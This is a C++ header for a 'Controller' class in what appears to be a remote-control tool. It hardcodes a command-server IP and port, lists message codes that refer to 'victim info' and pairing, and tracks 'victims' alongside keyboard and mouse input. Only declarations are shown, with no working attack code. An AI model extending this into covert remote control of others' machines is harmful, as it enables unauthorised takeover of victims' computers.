#pragma once
#include "client.h"
#include <SFML/Network.hpp>
#include <SFML/Graphics.hpp>
#include "Mlib/Util/util.hpp"
#include "Mlib/Io/keyboard.hpp"
#include "Mlib/Io/mouse.hpp"
#include <iostream>
#include <sstream>
#include <thread>

#define SERVER_IP "2.235.241.210"
#define SERVER_PORT 9002

/* possible messages form server:
c: controller accepted
n: controller info
l: victim info
e: exit
r: erase clients list
d: display clients list
p: paired with
*/

class Controller
{
public:
	Controller();
	void controlWindow();

private:
	void receiveInfo();
	void takeCmdInput();
	void connectServer();
	void displayList();

	std::vector<Client> controllers, victims;
	bool isRunning = true, isConnected = false, isPaired = false, isControlling = false;
	const Mlib::Vec2i screenSize = Mlib::displaySize();
	sf::TcpSocket server;
	sf::RenderWindow w;
	const std::string ip = sf::IpAddress::getPublicAddress().toString();
	sf::Uint16 id = 0;
	Mlib::Vec2i lastMousePos = Mlib::Mouse::getPos();
};

